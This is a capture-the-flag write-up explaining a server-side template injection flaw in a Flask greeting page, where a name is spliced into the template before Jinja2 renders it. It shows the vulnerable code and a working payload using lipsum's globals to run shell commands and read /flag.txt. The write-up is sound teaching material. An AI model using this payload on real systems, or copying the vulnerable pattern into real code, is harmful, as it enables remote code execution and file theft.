# SSTI Greeting

## The Vulnerability

The greeting HTML is built with an f-string, then spliced into the template before `render_template_string` processes it:

```py
greeting_html = f"<h3>Hello, {name}!</h3>"
page = TEMPLATE.replace("<!-- greeting -->", greeting_html)
return render_template_string(page)
```

Since `name` is inserted into the page before Jinja2 sees it, any `{{ }}` or `{% %}` syntax gets evaluated as a template expression. That is SSTI.

### Confirmation

Submit `{{6*7}}` as the name; the page shows `Hello, 42!` instead of `Hello, {{6*7}}!`.

## Getting the Flag

The flag is stored in `/flag.txt` inside the container. The `lipsum` function is available in the Jinja2 template context, and its `__globals__` dictionary includes the `os` module, which lets us execute shell commands:

```text
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
```

Submit that as the name and the flag appears on the page.
